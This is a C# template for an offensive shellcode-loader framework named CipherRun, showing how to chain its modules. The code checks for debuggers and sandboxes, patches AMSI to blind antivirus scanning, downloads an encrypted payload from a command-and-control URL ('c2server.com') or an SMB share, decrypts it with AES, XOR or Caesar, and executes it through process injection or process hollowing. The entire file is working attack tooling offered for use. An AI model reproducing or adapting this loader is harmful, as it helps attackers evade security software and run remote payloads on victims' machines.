/* This File Is a Template For Stuff You Can Do Using The Framework */


using static CipherRun.Heuristics.AntiDebug;
using static CipherRun.Heuristics.Heuristics;
using static CipherRun.Patchers.Amsi;
using CipherRun.Decryptors;
using CipherRun.Retrievers;


namespace CipherRun
{
    class CipherRun
    {
        static void Main(string[] args)
        {
            // call heuristic check. if sleep was skipped halt execution
            if (Sleep()) { return; }
            if (IsBeingDebugged()) { return; }
            
            
            // encrypt payload
            byte[] buf = Caesar.Encryption.Encrypt(Shellcode.buf);

            // patch amsi
            AmsiInterception();

            // retrieve your payload (http)
            byte[] payload = Http.GetPayload("http://c2server.com/payload.bin");

            // retrieve your payload (smb) (personal favorite)
            byte[] payload1 = Smb.GetPayload("username", "password", "payload.bin", "ShareUncPath");

            // Decrypt The Payload (aes)
            byte[] aes_dec_payload = AES.Decrypt(payload, "aes_key", "aes_iv");

            // old school? Decrypt The Payload (XOR)
            byte[] xor_key = { 0x1, 0x3, 0x3, 0x7};
            byte[] xor_dec_payload = XOR.Decrypt(payload1, xor_key);


            /* Decryption Limitations: for AES keys and IVs has to be strings */

            // call runner. Uncomment your choice

            //// Caesar
            Caesar.Injection.Inject(buf);
            Caesar.Hollowing.Hollow(aes_dec_payload);
            // you got the point ;)
        }
    }
}